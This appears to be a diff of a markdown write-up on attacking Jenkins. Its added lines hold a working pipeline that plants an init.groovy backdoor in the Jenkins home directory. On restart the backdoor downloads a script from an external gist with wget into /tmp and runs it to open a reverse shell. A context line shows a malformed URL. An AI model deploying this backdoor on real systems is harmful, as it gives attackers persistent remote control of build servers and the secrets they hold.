@@ -48,7 +48,27 @@ pipeline{
 - We need to add ```init.groovy``` file with our payload at home directory ( the directory that contains other config files pf Jenkins, sometimes referred as $JENKINS_HOME )
 - To trigger this, we would need a restart.
 - We have couple of options what we can do with our backdoor scripts
-  - Get a reverse shell - From my personal research I found my payloads / the ones from internet blocked the Jenkins from rebooting. This is because Jenkins is waiting for the init.groovy to complete before it can proceed. If you have a non blocking playload do let me know.
+  - Get a reverse shell - We can run this via pipeline
+``` Groovy
+pipeline{
+    agent any
+    stages{
+        stage('Adding a groovy init file'){
+            steps{
+                sh '''
+                    echo "'wget -O /tmp/revshell.sh  https://gist.githubusercontent.com/dibsy/00d346575659f977b353f95a7064e966/raw/dc89f902db2c81fe96c2f5a102e16c25b8308983/temp-cmd.txt'.execute()" > /var/lib/jenkins/init.groovy
+                    echo "sleep(5000)" >> /var/lib/jenkins/init.groovy
+                    echo "'sh /tmp/revshell.sh'.execute()" >> /var/lib/jenkins/init.groovy
+                    '''
+            }
+        }
+    }
+}
+```
+  
+  
+  
+  
 init.groovy
 ```
 "wget -o /tmp/revshell.sh  http://https://gist.githubusercontent.com/dibsy/temp-cmd.txt".execute()
